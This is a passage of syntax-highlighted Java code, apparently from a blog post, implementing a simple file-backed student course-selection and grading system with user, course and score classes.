class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    String user;    <span class="comment">// 用户名</span></span><br><span class="line">    String pwd;     <span class="comment">// 密码</span></span><br><span class="line">    <span class="type">int</span> type;       <span class="comment">// 用户类型</span></span><br><span class="line">    <span class="type">int</span> account_id; <span class="comment">// 用户编号</span></span><br><span class="line">    String account_name;    <span class="comment">// 用户名字</span></span><br><span class="line">    Teach teach;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">        <span class="built_in">this</span>.pwd = pwd;</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.account_id = account_id;</span><br><span class="line">        <span class="built_in">this</span>.account_name = account_name;</span><br><span class="line">        <span class="built_in">this</span>.teach = teach;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account_name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getUserId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account_id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(user, pwd, type, account_id, account_name, teach);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生选课。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">selStuCourse</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        teach.selStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生可选课程。 返回可选课程字典</span></span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourseStuNotSelected</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getCourseStuNotSelected(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生退课。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delStuCourse</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        teach.delStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生所选课程信息。 返回所选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreStu</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getScoreStu(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teacher</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(user, pwd, type, account_id, account_name, teach);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询课程所有学生成绩。 返回成绩列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreTeacher</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getScoreTeacher(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询选中课程详细信息。返回课程信息</span></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getCourseInfo</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teach.getCourseInfo(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 教师对学生课程打分。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">scoreStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id, <span class="type">int</span> student_score)</span> &#123;</span><br><span class="line">        teach.scoreStuCourse(student_id, course_id, student_score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Manager</span> <span class="keyword">extends</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Manager</span><span class="params">(String user, String pwd, <span class="type">int</span> type, <span class="type">int</span> account_id, String account_name, Teach teach)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(user, pwd, type, account_id, account_name,teach);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新建课程。如果成功，返回课程编号，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">newCourse</span><span class="params">(String course_name, <span class="type">int</span> teacher_id , String course_info)</span> &#123;</span><br><span class="line">        teach.newCourse(course_name, teacher_id, course_info);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teach</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Database db;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teach</span><span class="params">(Database db)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.db = db;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 新建课程，进行检查并进行数据库存入。如果成功，返回课程编号，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">newCourse</span><span class="params">(String course_name, <span class="type">int</span> teacher_id , String course_info)</span> &#123;</span><br><span class="line">        db.addCourse(course_name, teacher_id, course_info);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生选课，进行检查并进行数据库存入。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">selStuCourse</span><span class="params">(<span class="type">int</span> account_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        db.addStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 学生退课，进行检查并进行数据库存入。如果成功，返回1，如果失败，返回-1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delStuCourse</span><span class="params">(<span class="type">int</span> account_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        db.delStuCourse(account_id, course_id);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 教师对学生课程打分。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">scoreStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id, <span class="type">int</span> student_score)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(student_score&lt;-<span class="number">1</span> | student_score&gt;<span class="number">100</span>) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="literal">null</span>, <span class="string">&quot;请输入0-100的整数&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            db.addStuScore(student_id, course_id, student_score);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询课程详细信息。返回课程信息</span></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getCourseInfo</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> db.getCourse().get(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询课程所有学生成绩。 返回成绩列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreTeacher</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> db.getScoreCourse(course_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生可选课程。 返回可选课程字典</span></span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourseStuNotSelected</span><span class="params">(<span class="type">int</span> account_id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> db.getCourseNotSelected(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询学生所选课程信息。 返回所选课程列表</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreStu</span><span class="params">(<span class="type">int</span> account_id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> db.getScoreStu(account_id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Database</span> &#123;</span><br><span class="line">    <span class="comment">// 存储文件</span></span><br><span class="line">    <span class="keyword">private</span> File data_course;</span><br><span class="line">    <span class="keyword">private</span> File data_score;</span><br><span class="line">    <span class="keyword">private</span> File data_account;</span><br><span class="line">    <span class="comment">// 当前最大编号，用于新增时</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">course_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">student_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">teacher_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">manager_id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 运行时数据存储</span></span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, List&gt; course = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, List&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, List&gt; account = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, List&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, String&gt; manager = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, String&gt; teacher = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, String&gt; student = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, String&gt;();</span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;List&gt; score = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 参数：存储文件位置</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Database</span><span class="params">(String file_course, String file_score, String file_account)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.data_course = <span class="keyword">new</span> <span class="title class_">File</span>(file_course);</span><br><span class="line">        <span class="built_in">this</span>.data_score = <span class="keyword">new</span> <span class="title class_">File</span>(file_score);</span><br><span class="line">        <span class="built_in">this</span>.data_account = <span class="keyword">new</span> <span class="title class_">File</span>(file_account);</span><br><span class="line">        <span class="built_in">this</span>.readIn();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourse</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> course;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, List&gt; <span class="title function_">getCourseNotSelected</span><span class="params">(<span class="type">int</span> student_id)</span> &#123;</span><br><span class="line">        HashMap&lt;Integer, List&gt; map_copy = (HashMap&lt;Integer, List&gt;) course.clone();</span><br><span class="line">        System.out.println(map_copy.toString());</span><br><span class="line">        <span class="keyword">for</span>(List l: score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id) &#123;</span><br><span class="line">                map_copy.remove((<span class="type">int</span>)l.get(<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(map_copy.toString());</span><br><span class="line">        <span class="keyword">return</span> map_copy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getTeacherCourse</span><span class="params">(<span class="type">int</span> teacher_id)</span> &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">teacher_course_list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(Entry&lt;Integer, List&gt; entry: course.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)entry.getValue().get(<span class="number">1</span>)==teacher_id) &#123;</span><br><span class="line">                teacher_course_list.add((<span class="type">int</span>)entry.getKey());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> teacher_course_list;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreCourse</span><span class="params">(<span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        ArrayList&lt;List&gt; list_copy = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(List l : score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">1</span>)==course_id) &#123;</span><br><span class="line">                list_copy.add(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list_copy;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, String&gt; <span class="title function_">getTeacher</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teacher;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;Integer, String&gt; <span class="title function_">getStudent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScore</span><span class="params">(<span class="type">int</span> student_id)</span> &#123;</span><br><span class="line">        ArrayList&lt;List&gt; list_copy = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(List l : score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id) &#123;</span><br><span class="line">                list_copy.add(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list_copy;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;List&gt; <span class="title function_">getScoreStu</span><span class="params">(<span class="type">int</span> student_id)</span> &#123;</span><br><span class="line">        ArrayList&lt;List&gt; list_copy = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(List l : score) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id) &#123;</span><br><span class="line">                list_copy.add(l);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list_copy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HashMap&lt;String, List&gt; <span class="title function_">getAccount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">getAccount</span><span class="params">(String user)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> account.get(user);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//从文件中读入课程、用户名等数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readIn</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_course,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_score</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_score,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_account</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_account,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="variable">fileLength</span> <span class="operator">=</span> raf_course.length();</span><br><span class="line">        <span class="type">long</span> <span class="variable">filePoint</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> course_id;</span><br><span class="line">        String course_name;</span><br><span class="line">        <span class="type">int</span> course_teacher_id;</span><br><span class="line">        String course_info;</span><br><span class="line">        raf_course.seek(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            <span class="built_in">this</span>.course_id = Integer.parseInt(raf_course.readLine());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            course_id = Integer.parseInt(raf_course.readLine());</span><br><span class="line">            course_name = raf_course.readLine();</span><br><span class="line">            course_name = <span class="keyword">new</span> <span class="title class_">String</span>(course_name.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            course_teacher_id = Integer.parseInt(raf_course.readLine());</span><br><span class="line">            course_info = raf_course.readLine();</span><br><span class="line">            course_info = <span class="keyword">new</span> <span class="title class_">String</span>(course_info.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            course.put(course_id, Arrays.asList(course_name,course_teacher_id,course_info));</span><br><span class="line">            filePoint = raf_course.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        raf_course.close();</span><br><span class="line">        </span><br><span class="line">        fileLength = raf_account.length();</span><br><span class="line">        filePoint = <span class="number">0</span>;</span><br><span class="line">        String account_user;</span><br><span class="line">        String account_pwd;</span><br><span class="line">        <span class="type">int</span> account_type;</span><br><span class="line">        Integer account_id;</span><br><span class="line">        String account_name;</span><br><span class="line"></span><br><span class="line">        raf_account.seek(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            <span class="built_in">this</span>.manager_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            <span class="built_in">this</span>.teacher_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            <span class="built_in">this</span>.student_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            filePoint = raf_account.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            account_user = raf_account.readLine();</span><br><span class="line">            account_user = <span class="keyword">new</span> <span class="title class_">String</span>(account_user.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            account_pwd = raf_account.readLine();</span><br><span class="line">            account_pwd = <span class="keyword">new</span> <span class="title class_">String</span>(account_pwd.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            account_type = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            account_id = Integer.parseInt(raf_account.readLine());</span><br><span class="line">            account_name = raf_account.readLine();</span><br><span class="line">            account_name = <span class="keyword">new</span> <span class="title class_">String</span>(account_name.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">            <span class="keyword">switch</span>(account_type) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    manager.put(account_id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    teacher.put(account_id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    student.put(account_id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            account.put(account_user, Arrays.asList(account_pwd, account_type, account_id,account_name));</span><br><span class="line">            filePoint = raf_account.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        raf_account.close();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        fileLength = raf_score.length();</span><br><span class="line">        filePoint = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> student_id;</span><br><span class="line">        <span class="type">int</span> student_course_id;</span><br><span class="line">        <span class="type">int</span> student_score;</span><br><span class="line">        raf_score.seek(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(filePoint &lt; fileLength) &#123;</span><br><span class="line">            student_id = Integer.parseInt(raf_score.readLine());</span><br><span class="line">            student_course_id = Integer.parseInt(raf_score.readLine());</span><br><span class="line">            student_score = Integer.parseInt(raf_score.readLine());</span><br><span class="line">            score.add(Arrays.asList(student_id,student_course_id,student_score));</span><br><span class="line">            filePoint = raf_score.getFilePointer();</span><br><span class="line">        &#125;</span><br><span class="line">        raf_score.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建用户  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAccount</span><span class="params">(String account_user, String account_pwd, <span class="type">int</span> account_type, String account_name)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(!account.containsKey(account_user)) &#123;</span><br><span class="line">            <span class="keyword">switch</span>(account_type) &#123;</span><br><span class="line">                <span class="keyword">case</span>(<span class="number">0</span>):</span><br><span class="line">                    manager_id = manager_id+<span class="number">1</span>;</span><br><span class="line">                    id = manager_id;</span><br><span class="line">                    manager.put(id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="number">1</span>):</span><br><span class="line">                    teacher_id = teacher_id+<span class="number">1</span>;</span><br><span class="line">                    id = teacher_id;</span><br><span class="line">                    teacher.put(id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span>(<span class="number">2</span>):</span><br><span class="line">                    student_id = student_id+<span class="number">1</span>;</span><br><span class="line">                    id = student_id;</span><br><span class="line">                    student.put(id, account_name);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            account.put(account_user, Arrays.asList(account_pwd, account_type, id, account_name));</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Account &quot;</span>+account_user+<span class="string">&quot; has already exists.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        updateAccountData();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCourse</span><span class="params">(String course_name, <span class="type">int</span> course_teacher_id, String course_info)</span> &#123;</span><br><span class="line">        course_id = course_id + <span class="number">1</span>;</span><br><span class="line">        course.put(course_id, Arrays.asList(course_name, course_teacher_id, course_info));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        score.add(Arrays.asList(student_id, course_id, -<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delStuCourse</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;del &quot;</span>+student_id+<span class="string">&quot; &quot;</span>+course_id);</span><br><span class="line">        Iterator&lt;List&gt; i = score.iterator();</span><br><span class="line">        <span class="keyword">while</span>(i.hasNext())&#123;</span><br><span class="line">            <span class="type">List</span> <span class="variable">l</span> <span class="operator">=</span> i.next();</span><br><span class="line">            <span class="keyword">if</span>((<span class="type">int</span>)l.get(<span class="number">0</span>)==student_id &amp; (<span class="type">int</span>)l.get(<span class="number">1</span>)==course_id)&#123;</span><br><span class="line">                i.remove();</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addStuScore</span><span class="params">(<span class="type">int</span> student_id, <span class="type">int</span> course_id, <span class="type">int</span> student_score)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(List&lt;Integer&gt; l:score) &#123;</span><br><span class="line">            <span class="keyword">if</span>(l.get(<span class="number">0</span>)==student_id &amp; l.get(<span class="number">1</span>)==course_id) &#123;</span><br><span class="line">                l.set(<span class="number">2</span>, student_score);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clearFile</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FileWriter</span>(file);</span><br><span class="line">        fileWriter.write(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        fileWriter.flush();</span><br><span class="line">        fileWriter.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateCourseData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        clearFile(data_course);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_course,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        raf_course.writeBytes(course_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> key:course.keySet()) &#123;</span><br><span class="line">            raf_course.write((key+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_course.write((course.get(key).get(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_course.write((course.get(key).get(<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_course.write((course.get(key).get(<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        raf_course.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateScoreData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        clearFile(data_score);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_score</span> 